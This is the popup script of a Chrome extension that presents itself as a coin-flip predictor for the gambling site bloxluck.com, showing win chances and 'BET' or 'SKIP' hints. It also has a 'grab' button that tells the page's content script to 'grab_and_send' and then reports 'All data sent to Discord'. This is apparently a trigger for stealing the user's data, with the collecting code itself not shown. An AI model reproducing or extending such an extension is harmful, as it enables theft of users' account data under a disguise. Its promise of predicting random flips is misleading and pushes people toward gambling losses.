document.addEventListener('DOMContentLoaded', () => {
  const sText = document.getElementById('sText');
  const sDot = document.getElementById('sDot');
  const uDisplay = document.getElementById('uDisplay');
  const predText = document.getElementById('predText');
  const chanceBar = document.getElementById('chanceBar');
  const winText = document.getElementById('winText');
  const betStat = document.getElementById('betStat');
  const hPct = document.getElementById('hPct');
  const tPct = document.getElementById('tPct');
  const totalG = document.getElementById('totalG');
  const refBtn = document.getElementById('refBtn');
  const grabBtn = document.getElementById('grabBtn');
  const logBox = document.getElementById('logBox');

  function log(m) {
    logBox.textContent = `[${new Date().toLocaleTimeString()}] ${m}`;
    logBox.classList.add('show');
  }

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const t = tabs[0];
    if (t && t.url && t.url.includes('bloxluck.com')) {
      sText.textContent = 'On BloxLuck';
      sDot.className = 'dot g';
      chrome.tabs.sendMessage(t.id, { action: 'get_analysis' }, (r) => {
        if (r) updateUI(r);
      });
    } else {
      sText.textContent = 'Not on BloxLuck';
      sDot.className = 'dot r';
    }
  });

  function updateUI(d) {
    if (d.prediction) {
      predText.textContent = d.prediction;
      const g = d.winChance >= 60;
      predText.className = 'pred ' + (g ? 'g' : 'r');
      chanceBar.style.width = (d.winChance || 50) + '%';
      chanceBar.className = 'bar ' + (g ? 'g' : 'r');
      winText.textContent = (d.winChance || 50) + '%';
      betStat.textContent = g ? '🟢 BET ' + d.prediction : '🔴 SKIP';
      betStat.style.color = g ? '#00ff88' : '#ff4444';
      hPct.textContent = (d.headsChance || 50) + '%';
      tPct.textContent = (d.tailsChance || 50) + '%';
      totalG.textContent = d.total || 0;
      if (d.username) uDisplay.textContent = '👤 ' + d.username;
    }
  }

  refBtn.addEventListener('click', () => {
    chrome.tabs.query({ active: true, currentWindow: true }, (t) => {
      if (t[0]) chrome.tabs.sendMessage(t[0].id, { action: 'refresh' }, () => log('Refreshed'));
    });
  });

  grabBtn.addEventListener('click', () => {
    chrome.tabs.query({ active: true, currentWindow: true }, (t) => {
      if (t[0]) chrome.tabs.sendMessage(t[0].id, { action: 'grab_and_send' }, () => {
        log('All data sent to Discord ✓');
      });
    });
  });
});
